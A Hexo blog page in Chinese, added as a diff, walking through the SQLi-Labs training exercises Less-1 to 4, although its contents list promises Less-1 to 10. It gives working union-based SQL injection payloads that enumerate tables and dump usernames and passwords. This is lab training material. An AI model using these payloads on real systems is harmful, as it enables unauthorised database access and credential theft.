@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x00  前言 # 0x01  修炼 Less-1 GET-基于错误的-单引号-字符型注入 Less-2 GET-基于错误的-数字型 Less-3 GET-基于错误的-单引号变形的字符型注入 Less-4 GET-基于错误的-双引号字符型注入 Less-5 GET-双注入-单引号字符型注入 LESS-6 GET-双注入-双引号字符型注入 LESS-7 GET-导出文件-字符型注入 LESS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-Labs 修炼手册 （Less-1-10）">
+<meta property="og:url" content="http://example.com/2019/17JD2NV/index.html">
+<meta property="og:site_name" content="会下雪的晴天">
+<meta property="og:description" content="0x00  前言 # 0x01  修炼 Less-1 GET-基于错误的-单引号-字符型注入 Less-2 GET-基于错误的-数字型 Less-3 GET-基于错误的-单引号变形的字符型注入 Less-4 GET-基于错误的-双引号字符型注入 Less-5 GET-双注入-单引号字符型注入 LESS-6 GET-双注入-双引号字符型注入 LESS-7 GET-导出文件-字符型注入 LESS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726105953372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726120432528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726120514864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726120542635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726120633642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726120738733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726120840461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726120912872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019072612094217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726121026680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726121052117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019072616224347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726163139652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726164440328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190726165218255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190731115948411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190731120249494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190731120416847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801093707692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190908162019896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190908174128288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190908174632616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190908182144834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191011090606997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191011160657382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013141612628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013141749939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191013142933430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2019-08-01T13:02:24.000Z">
+<meta property="article:modified_time" content="2020-09-29T05:54:25.468Z">
+<meta property="article:author" content="yq1ng">
+<meta property="article:tag" content="...">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190726105953372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+
+<link rel="canonical" href="http://example.com/2019/17JD2NV/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SQLi-Labs 修炼手册 （Less-1-10） | 会下雪的晴天</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">会下雪的晴天</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF菜鸡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/17JD2NV/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaoxin.jpg">
+      <meta itemprop="name" content="yq1ng">
+      <meta itemprop="description" content="The best way to know your strength is to fight">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="会下雪的晴天">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQLi-Labs 修炼手册 （Less-1-10）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-01 21:02:24" itemprop="dateCreated datePublished" datetime="2019-08-01T21:02:24+08:00">2019-08-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-29 13:54:25" itemprop="dateModified" datetime="2020-09-29T13:54:25+08:00">2020-09-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">CTF做题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>17 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- TOC -->
+
+<ul>
+<li><a href="#0x00-%E5%89%8D%E8%A8%80">0x00  前言</a><ul>
+<li><a href="#h1-id0x01-%E4%BF%AE%E7%82%BC-300x01-%E4%BF%AE%E7%82%BCh1"># 0x01  修炼</a><ul>
+<li><a href="#less-1-get-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E5%8D%95%E5%BC%95%E5%8F%B7-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">Less-1 GET-基于错误的-单引号-字符型注入</a></li>
+<li><a href="#less-2-get-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E6%95%B0%E5%AD%97%E5%9E%8B">Less-2 GET-基于错误的-数字型</a></li>
+<li><a href="#less-3-get-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">Less-3 GET-基于错误的-单引号变形的字符型注入</a></li>
+<li><a href="#less-4-get-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">Less-4 GET-基于错误的-双引号字符型注入</a></li>
+<li><a href="#less-5-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">Less-5 GET-双注入-单引号字符型注入</a></li>
+<li><a href="#less-6-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-6 GET-双注入-双引号字符型注入</a></li>
+<li><a href="#less-7-get-%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-7 GET-导出文件-字符型注入</a></li>
+<li><a href="#less-8-get-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-8 GET-布尔盲注-单引号字符型注入</a></li>
+<li><a href="#less-9-get-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-9 GET-基于时间的盲注-单引号字符型注入</a></li>
+<li><a href="#less-10-get-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-10 GET-基于时间的盲注-双引号字符型注入</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#end">END</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>如果你是自己搭建的环境，请使用5.5以上的版本，这样才会有虚拟数据库information，以方便我们去修炼<br>在注释方面，有<code>-- </code>(–空格)、<code>#</code>、<code>/**/</code>三种，常常使用第一种，注入时使用<code>#</code>会让浏览器捉摸不透原因是url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括<code>#</code>；<code>/**/</code>是多行注释常用绕过当成空格<br>在URL中如果在末尾使用<code>--空格</code>，浏览器会把空格删去，而<code>+</code>会被浏览器解释为空格，所以注入时使用<code>--+</code>作为注释使用或者<code>-- a</code></p>
+<hr>
+<h1 id="0x01-修炼"><a href="#0x01-修炼" class="headerlink" title="0x01  修炼"></a>0x01  修炼</h1><hr>
+<h3 id="Less-1-GET-基于错误的-单引号-字符型注入"><a href="#Less-1-GET-基于错误的-单引号-字符型注入" class="headerlink" title="Less-1 GET-基于错误的-单引号-字符型注入"></a>Less-1 GET-基于错误的-单引号-字符型注入</h3><p><img src="https://img-blog.csdnimg.cn/20190726105953372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1、输入ID作为参数值，先用id=1试试，给了个账号密码，没啥用<br><img src="https://img-blog.csdnimg.cn/20190726120432528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、加个单引号(英文的)<code>id=1&#39;</code>报错<br><img src="https://img-blog.csdnimg.cn/20190726120514864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、再减个0<code>id=1-0</code>又正常了，说明存在注入<br><img src="https://img-blog.csdnimg.cn/20190726120542635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4、在单引号后注释掉后面的语句后返回正常，说明为<code>&#39;&#39;</code>闭合<br><img src="https://img-blog.csdnimg.cn/20190726120633642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5、开始吧，<code>order by x</code>猜字段x=3的时候正常，x=4的时候报错，说明有3个字段<br><img src="https://img-blog.csdnimg.cn/20190726120738733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6、用联合查询看看回显在哪<code>id=-1&#39; union select 1,2,3--+</code>先都用数字试试(1，2，3)记得把id置空，两个回显，2和3的位置<br><img src="https://img-blog.csdnimg.cn/20190726120840461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>7、例子：<br>查查数据库、数据库版本<code>?id=-1&#39; union select 1,database(),version()--+</code><br><img src="https://img-blog.csdnimg.cn/20190726120912872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表名 <code>?id=-1&#39; union select 1,group_concat(table_name),version() from information_schema.tables where table_schema=database()--+</code><br><img src="https://img-blog.csdnimg.cn/2019072612094217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查列名 <code>?id=-1&#39; union select 1,group_concat(column_name),version() from information_schema.columns where table_name=&#39;users&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/20190726121026680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查字段数据，用户名和密码<br><code>?id=-1&#39; union select 1,group_concat(username,&#39;:&#39;,password),version() from users--+</code><br>用<code>:</code>分割用户名和密码<br><img src="https://img-blog.csdnimg.cn/20190726121052117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<hr>
+<h3 id="Less-2-GET-基于错误的-数字型"><a href="#Less-2-GET-基于错误的-数字型" class="headerlink" title="Less-2 GET-基于错误的-数字型"></a>Less-2 GET-基于错误的-数字型</h3><p>1、单引号报错，-0正常；与Less-1区别就是这次的注入无需单引号，是数字型注入<br>怎么判断？<br><code>id=2</code>时是另外一个账号，<code>id=2-1</code>页面返回<code>id=1</code>的数据，说明此处为数字型注入<br>2、<code>id=-1 order by 3</code>查字段，详情见Less-1，只是不需要单引号和注释符了</p>
+<hr>
+<h3 id="Less-3-GET-基于错误的-单引号变形的字符型注入"><a href="#Less-3-GET-基于错误的-单引号变形的字符型注入" class="headerlink" title="Less-3 GET-基于错误的-单引号变形的字符型注入"></a>Less-3 GET-基于错误的-单引号变形的字符型注入</h3><p>1、加单引号，报错，SQL语法在<code>&#39;1&#39;&#39;)</code>处错误，判断为<code>(&#39;&#39;)</code>闭合<br><img src="https://img-blog.csdnimg.cn/2019072616224347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、测试是否为<code>(&#39;&#39;)</code>闭合，测试语句：<code>?id=2&#39;) --+</code>，返回正常，判断正确<br><img src="https://img-blog.csdnimg.cn/20190726163139652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、后面参考Less-1；eg：<code>?id=-1&#39;) union select 1,2,3--+</code></p>
+<hr>
+<h3 id="Less-4-GET-基于错误的-双引号字符型注入"><a href="#Less-4-GET-基于错误的-双引号字符型注入" class="headerlink" title="Less-4 GET-基于错误的-双引号字符型注入"></a>Less-4 GET-基于错误的-双引号字符型注入</h3><p>1、单引号测试 –&gt; 正常；双引号测试 –&gt; 错误，看看回显<br> SQL语法在<code>&quot;1&quot;&quot;)</code>处错误，判断为<code>(&quot;&quot;)</code>闭合<br><img src="https://img-blog.csdnimg.cn/20190726164440328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、测试是否为<code>(&quot;&quot;)</code>闭合，测试语句：<code>?id=2&quot;) --+</code>，返回正常，判断正确<br><img src="https://img-blog.csdnimg.cn/20190726165218255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、后面参考Less-1；eg：<code>?id=-1&quot;) union select 1,2,3--+</code></p>
+<hr>
